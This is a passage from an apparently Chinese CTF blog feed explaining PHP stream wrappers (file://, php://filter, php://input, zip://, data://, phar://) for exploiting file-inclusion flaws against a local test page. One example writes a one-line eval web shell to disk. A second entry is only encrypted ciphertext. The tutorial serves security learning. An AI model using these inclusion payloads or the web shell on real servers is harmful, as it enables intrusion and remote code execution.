    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-file协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-file协议font"></a> <font color="navy"><code>0x00 file://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1. <code>file://[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-1.jpg" alt></p><p>      2. <code>[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-2.jpg" alt></p><p>      3. <code>[http://网络路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-3.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.file.php</a></li></ul><h2 id="font-color-navy0x01-php协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-php协议font"></a> <font color="navy"><code>0x01 php://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p></li></ul><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><ul><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p></li></ul><table><thead><tr><th>php://filter 参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<strong>|</strong>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><ul><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p></li></ul><p><code>字符串过滤器</code></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><p><code>转换过滤器</code></p><table><thead><tr><th>转换过滤器</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td style="text-align:left">等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td style="text-align:left">quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><p><code>压缩过滤器</code></p><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><p><code>加密过滤器</code></p><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><ul><li><strong>示例</strong>：</li></ul><p>      1. <code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="/images/140-4.jpg" alt></p><p>      2.<code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-5.jpg" alt></p><p>若有写入权限，写入一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&apos;1juhua.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-6.jpg" alt></p><ul><li><strong>-参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://php.net/manual/zh/wrappers.php.php</a></li></ul><h2 id="font-color-navy0x02-zip-bzip2-zlib-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-zip-bzip2-zlib-协议font"></a> <font color="navy"><code>0x02 zip:// &amp; bzip2:// &amp; zlib:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）</p><p>      压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-7.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure><p>      2.压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><p><img src="/images/140-8.jpg" alt></p><p>      3.compress.zlib://file.gz</p><p>      压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><p><img src="/images/140-9.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a></li></ul><h2 id="font-color-navy0x03-data-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-data-协议font"></a> <font color="navy"><code>0x03 data:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.data://text/plain,`</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-10.jpg" alt></p><p>      2.data://text/plain;base64,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="/images/140-11.jpg" alt></p><h2 id="font-color-navy0x04-http-https协议-font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-http-https协议-font"></a> <font color="navy"><code>0x04 http:// &amp; https://协议</code> </font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-12.jpg" alt></p></li></ul><h2 id="font-color-navy0x05-phar-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-phar-协议font"></a> <font color="navy"><code>0x05 phar:// 协议</code></font></h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-13.jpg" alt></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>参考文章：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p></blockquote><h3 id="font-color-navy0x06-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-参考文章font"></a> <font color="navy"><code>0x06 参考文章</code></font></h3><p><a href="https://zhuanlan.zhihu.com/p/25069779" target="_blank" rel="noopener">文件包含漏洞原理分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-file协议font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-file协议font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF-web 类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/24/2020.07.24%EF%BC%88139%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/24/2020.07.24（139）/</id>
    <published>2020-07-23T16:00:00.000Z</published>
    <updated>2020-08-17T14:27:59.670Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="692903eb44847d6e7ca78b57bc76c46b1bb17cf17332e58bde7c47c7b09844a9">85622e100507fc49db72026265d5d53bba5b2917323392df3e25f34662e8ec7b810c8d44d76d40e16fbdbd3bceafce506ee0f71bb2bbfdd1eaf450ee0a105c6deea4c486e92e0c4bac943e67823a234b9114b182c464fdd47323f84306375f42daed9b2e52003f78f4d2b970db66844e544c36dce4bcf0d2a388323b857a2371265c6129844bee07e33bcefbe1ff53f7f33fb21367df64cca786878fda574703b61e845f6dfad91888afd636f94228407963269ebcd8e1b59a8fb5247718fb9e1b8bdbfafaa2e43a7ee57b6e2276f5a4fd88dcea6162b990583ef510c557ff342f876ada61e80d9832ae7dbd92b87be5830e5f3c0f20d92725465b5e2cddefbfb7921b2b81abd24c28f651e0b6c6ce4487270eba8570a56f6e97c3c92d099239d24c0d6748d6004ccb97aed007f93dee4ec2660f7213aafae8e6d5ed54867d4e49ee74515e4afb57ed26c6076657b7dfb6dbe2e6861a2f275fe81a050439b62b974e4baa91cb6e29641e026d2ffa4ae7571943fc81f97639bb54da093cd96d23ddbc1f6e5ab74b7c5979c0f35b4645992942b104c85cb6315fe63f53bb74f793a61c0a44ffdce2297fc28df4c7e1602438090197c2f23bbae0303d631b6e24a20549a914550f3d6a7a25dea7f728e9be5eb2bcf18b66b8e95907300f3da95d667158015ef41a7513d50167542df9866ad39040bb15638feffac200a834ccc12bf414d616f8555b11307807736d54ea12b6f664462134c6ef421070f202b1dfeab1e17584b2400a842a1374f3fe6ee5fd939e0d2e33113f0a000d5bd6eb8effb49eb8951e121d08fa9cd9f2662943de2c5ddab490e5659b76d0e318a7948c37aa0c431b425a2744ed248e1a7980836d50a365fce8197b152527be0927d2c0216ef87a9500eac3ae3d1b82ca802b306441b6d89d60c199f806ef6d80d5498887bab08ba1a07a8e6e1ef66f459aee708b365d92a8c5b4dd0c0529cc760aee9dad643ab37782c0b6c32d72bf17f300442b1b3a6a292cff70711944a361b6bb9c0e7230ea58f6ae8788604ba82613a31b655a3c3fa10289840869939bade625e6b2fdad0cc3a4feaa683b66159697ac9044ea4166cdc45e4f7e329fae3c29276aaf728587c67ce1dd33be0b5465c28a00223a987b9f821c0729080f1b353b90c0b6b4c81cd4be5ed5c34b92550d5cfe852ae5d56577d095383a4aca3c8a25eeb79b2347bf0d7ac2137875de68f2a993f4db61b4116acb49d980b220f64b215bd11772e0e9977d7d90442a13cf7a035abda4550e6468a303627fc91ef209941f39603b069ff17664f4192ebfddbd8a98dcc08b6f88f132359d52519455c72cd1e7cbce04e9ebad693a0128b20a0d9cef3dd326921a7a2bc486a3b9464967c5ebcf358cd4d73e1848baa96fd2db1ae52d1c25cb6aefa4e7d6aac591097fefe57d80b7f52013053bc74ff16b9085a4c8d6bc296cbef67c053126d7309506e9858e4dd6b765db9ae6f07b145a3a1a62ee7eae28903f91309c5a05c3bb8605664e51823f72ccc5e151885c1a672b0fdc381a2d00fbd770b40950d3792be8e5241088598fcecdc555685e434eaa0ca35b25cebc8def30f64d698fe1db7dc569b9aadb3ae0be684efec7d48787c718360bea169a5254a03fca9ecd1c6eb58b3c4955f1b6c3857b8ec053de5e70385d79717e020893df47b707d3c1a70836ee0ad4a169da3b10a5439f355fa94da3a20106b8b6f68d0de47bf0b831536e60305a1e25915524bc4cae86e88222f5dd643132c9cf844d8e56b0f125f9a1d0e8f34a36dcd187b642b835311021fc011adff0f675de3cb6df7ff97c74885d7a4d799665e9c0c20dbf4788d1c0a85ae8d9fed7163975d73a8b001daa6437fe7390cb920e9f27383da666e1a62e4df1a07297d91e38e00d8bc48ee1bf36629c962d9f5af00454caccdb35a5294ff588d6f7e8112a240909b833554f62f1d5beb061af4c72378c1c83085bb2ba56f6c6998341e57cb11fb58206ec94ec4e66a66482be1860d627a2939d3cc85c169a25db004af8978e62c1700a15bdd064dbcaa5ddae769424bb61934bd19d296094873198c434fef1bb31eeeae10b548e768980fb66d2b19d93a1f3cf7058129fe80841683c0e1ff55166b4528d3ef559cf1527137eadc8820b4cf8780f04ca6b3a504e2facbf6b7bedd15b315fe54aff56bad28bda7450a2ff8b7a4bb9f55b2868eb5ba91c87f5526329a4083dd5ac151cdf17c4a8e647f06a35a7fb9c8aa97f2d8ad80e7b1a13e52359e6137546cc7e29ad50de7927e6f787938ad9f718831fd0238c53f0c93da68d05b688adcca5456a39c46448997615e0751aac6e0dab794a06bc08e6d5ecaa39635f4b2199217c9b7f4ce6bd7e1792b7462672e8449c6ccf7c4a49b46fba3826c4af66a9afb6cc93bf989fb47ee4897c11305db83c5cc4b1a0d2dca24ef1706ca21c3301b7962d6db484ae0942e7797605999a4ba87654a02f52142c05568fd6b9bd7108622dccd7bb527504970abd2fcfe16fbfc10dee037f94c3d5a9ad2d78b55774b2b37b2a9d3308ce8f5911e2b1ca2de3d453ca346afc53e9d053fd3cd49ff88d6026877aadd8acf349b0a648533958e7a8b4519662fe2cd0aca2a4bfe9afa2a47d2b20cb38798a5e136c7bef7a2567f32acabe43c3151169db63debbdde957009a91189a91f04a353384ade5ffd4591b347be2b9aed4a55a2baa2a2469ad9d1227d37071a5b0929d170672b7d2b0a33d81a1d69eca47f9bf1b60634cecd8bae555a0e307f0c0fa3fe248299a4d7348a1c0cb0ab438371d99d7f25252e7fe864583321f101b108b798271b82c0f211fd38615d6ee0bb200ae7a90aab6969b958be75773e1f128329d5309815deb5b46bf8d8323c47a026cbe7f6f4b580f6a0ce10ae14d89d353f0b5eb89deffa46a0ed6ba6ccee7a9f823d18211851a64515a18b11a97d1406a5cbd8950f0bf2794c13ec5397e8b09ebd758a10360cbaa1d68b589adbc753b6800b2f40c645de3c38286b9db343af40cbcb57cecc0574dad92225e92bd23311ff7e61bd53dce75f4cd4850b0f7c8a91f22f446ae7f83d1a51c2dcdb059093c6011516f8039d550b8a4ac107ebcb94150f01345d7f63fa58e3fd92d8efa4d517e299e55d8971bc1f10673fac715fbbc871d393a3eb3ea2fdb91bfcf05589e17be627e6bafef31172131e7d13296dc1e794be590df0df5db098605f24bff313f7cb0d95220983cf111d665bad569309ccee686e9dcfe8e1706e4f30e6703762017689dd65661a1f19cab32159a8605a4fa6f0dd1f4b6cd3c5581411511e3aadadde42044e3e854b3885d64379ce393d780518a9e0d8469c209c07c07d01466193c6363214e997de4764e2fbb665f7a57406e0535752a84f4e15db8a968ef0a71f6c138cdc09c36ab4881cc91c2f505b676d02ba3cbf7604ff8476ab7364994546739717e85d92472b39402eac9106853eef9f12a72b921764632a874b5a3091a8c014a491116910ab652a3608d288beffd52e1649a285fbe8d91f086e7d8263dc18d8905cc04997dab8a2707b85073e6703943deae7f89d6b619288b6c6b76c3636295ea876b3301b9738ed2c4d882dcf99ccd42699f11e5cd6e0938d34499fc06778fdb13b86d238ed609cdf86a7772bd71c7126c1c0e76bdcc2d672fb4e8cadb4a8d7e036044b150f2bca29b3543734c6e3824ce0461c453cdbccfd8e96c857b53ac997fb86d72361827fb96d964ef8b0c0d3ed88b8927c54bde4c9de570a0aebcb1c9771a04c57a3510102d5fe27a58b4d0c57b3b25a71e424011a0f9bd37d2fda04f828540eb8feef1b9c98b01d1d1a9b69e483d1fc64163860db50f14ef87c0b59399eafc473e819f8ccb41a86c39f42f0f308f4e137b17a7cd49850b0bd1a53383a3a9af0c51567539e03641f337fffea6fe2c0d463215ffe2f767f9b50f6e75debd8df7936b4c21add28fb80065211fba07cf10bdd0b361d638b9b7f715428aa6f1ef3685dbb1cd01953dbacd54cb3fb5de7d22e60bd699e75866a00d70d61fb2811d1a6efd18ab175f2781abd0ab771d7e898a36bc79fad964bb4213946497be94f5cc4c8c854c2c4104390f3305eb222b828fdab3d0717daa65e7cbdb07831b70a080419a61a8c3271ff026be765e133c78f50bde9ee17875c7dca07e7a7fec687940ca1fd7f65d421f22a052ec02b57af4856fe800d6ab9818843506fe69eeaaf793fe15ab22ecb8dd9976c5988c7dcd4c05005800506e83359ced236683291d9d2307a0cef14cb3c1c9a103d07cd96bba83751992ff87e509616e54e85169aeeebf245ddb00ab5103e8587e3ca0f3bb2a7a6f447faa84f33209d7c9b0a491f3e25a88888085e9ef976811ac3a7ddd3d4440f801c87e3127df86659f621e159d84222bafbcae9245f66c2198a665a61fd9242556b01637db45df109337f8f15f531065a2ba52537cfbd39a44f7f222b05812bc5e607d22241d89e033cd73a0ed742de991c726686c996e6fc3728921bb42989748292cb81bd9a8b71c26165d1f1d4e5ac881f504b583a3e83f2e904489edecd811114968f87e904195508a3c52c00f8f3fd1834dc1636fa7f3322a90eeff9789f2068ac053a350eeb91f98f4a2d45c7b8be90728030c7028a3796d1367d5a369475948c9372bbba8a0c47019a51aa7dd3911d7aafc30244b975444d9813f6aaa47bafd20ba550cd7cc487afdedc8a6c00279c73d9ac62437b553bc71073f16e4507cd7e05282321c8fe47a5b48d514f82a90f4945cf448e6e31279522b0522e2905c707e67d130ceb820057e9c8878fd6f735c3e04624aa13e85ecfd93523616ad0c6975635403769ff0ccdd1f22cdf3eb90bf0e2ad501152b959375350d8ef1581b49f7a2cea5088e6cbf4918daccb5f3eba403bbaa46c0fb8dec86adf272dc817d0adabbf1bf815602fba12b2cde65b0f149212e6fddd42b1ffaa4719e312e2ed0324fa7759dc76957fae9e7bcf8c5336dcfe7f7aac5d084695662b32ecad9ccdcc26eeb808a53401ba21d7bc649dd8b0afd1bde06fa229519989b053696d597ecb539c872c161b5ca8cf7053d7664789541412b1de7bed2220f403ea17dda51da63bd70b5cd8bc37dab912f6ca7b356119582e45605db5cd5c09d070a55cb3bdd387ba3fc414c9212583f866ef17988ee994ba45a28f6e20360c437e6d79a80538130bcbc3cb08dea8c1baf31f85e233417e73c4437191ea487ff3579e51c2e7a483f553f31d54d3b2da88a326d419ae910b7981b753a861ad353e03c392d27170708a14f2e3943edf7848612ecbf4129a04bfe864160c3e8579d25061d436ab18ba26cdd5ea522700b514924697c298721f086b60b6d2aac29a07f7f2a30f094ccf83fc2d3a61716873e25d60c1789307950adf741aaa1a47c3f6972c2bd4f1d2c8eabccb8bb7102c092760eebc5009ea585985202f20ed54837832e2fb277c751cb232b1638a93214ec174136997af8e8c149fd7cb169656b80ea94c91466d6371d01f4e5455e372961d0f69ce99364595420a0881e0fc230ad42726a2c02ba85a3bc0fcbbbc8b3d46516a9957e1af5affb1e9a27a8e138c3c58360d2aab6ca53e317f3bfc154c15dbd523849f0689d97f0c44f42cb9eb4644c5feaf56e57256ec0c9c7a8f274815dcb3d9858f620e2067072e5b329463fcdee9ddc2164f8e41fe075e0faeaae931896122b128b3d765e25344bec7fbfb7674f46fdba932a6654c477769e37b6c72978ca8a99ee49f5dfb3bb83e008e26b5f7ae319429baac6564516f62305cc72d2bf35ac6b891bd80433eb6125e24e7a2678bd76bcd929818e7c047b182b70eb173d1a12eafa63c0ef1a680d4d6135324372bb5a0e7f8443edd888462d071467c42581fa5686d1925121f2b618091f6ca9d2084d1b69ae12c1631747106599f6c333bbf13fa8fdbda8d02eec055d5aba8048acc7c5ea77a2ddded4e0456360785d71791cd1a4228db3bd2bc58bfe4678799763c85a8467a6f4891c81c3e39c3eed01acbc68397bb621384b9137ac05be419dba11a085fb5a1b8487a98108db1ab8996fbbbb7007dfbed687e4af8b61f6e8fa0b7630ec7ff5e0c180ee432518e1b753994f8e0500eaa0cc2bf4ee978acafbb36a69d41e7d57d2026e110c097ebbc9c9738211d24fd20274cb599da9fd75e3c521ef78b7715e06ab74ff4ad1449cf1879d20ec3b4e066238c60e29f193078908ebf6e5b34b1654ed924b7f2551af48b294c0a4e5a331b43f08cbc63ce1ad3a61cc14134d7f49ef61c14b73a5d3a24cb3e0eaeb8ad2455e4ad244bdadc389327dba6862e8374b3d638153e8b9e72bf405b4deabab6852a75d45fbcae60af8bd6338fc7f46a667d30deaaba52605b181c57044520fbb57eb341c2072b6cb8b4089ddb15a6201472763f3ff378f284445ca45eb753a0755b8db80e5ef37453c2a58c1a9dda8bab757756746af1aef06d63fa02b0a133697f53dbaeb768edac1d4dd6625ce51ab0a9b6c163aa7cb1f2cc1b6ad62161fe34eae0792e07c864754cc98680297001a7947d58af6312aae965593a63a8f87ba2d58a1e3d557bbdccbd185b0512050483007b2b63319aeeab0118b88aa934dbf8f450ae4036d5fba9ce645f0d88a3d041902d9aa5a3033071e8a924d2cb0eff4f75ef87b1b6009d3bef529859c946af58c591708844484ea268ce514903d6b1e6c36622fb23c85e4cc08bce4b09c657a879f3024de975421dfa9f273a7690a8540bd0f2698d9a90b88aaad298ea920fbd24ec5691bc390084f4dc475e7ffbe20f1759b11241a88a6c7f0518d960c726114343b5dc190e450772afa588d84fe521b2b79d7187fcbcb6a4e24a0724e0971279f42cd5e27fa6b4593bb9cd04457e88c115f1eecdd63882f4bc46d9c763d0007fbfc890804409abfd2aadd43604618d513953af0ff906fadd47259f9e7b7bf659d7d12591084660199dd579ec3df6a110205e5cd791c5cde404c15f6a4e4000a4c9e4967f2ed2446cd228ba4835af37c23e24fa223b0f0f83fd20921a81ab3acc3f0116ba74dd2b02cc2742238788e0657bf4dae957b8821d084bcbf2ca26f57982f3cc30c28b28546c5c119bdfaa3de0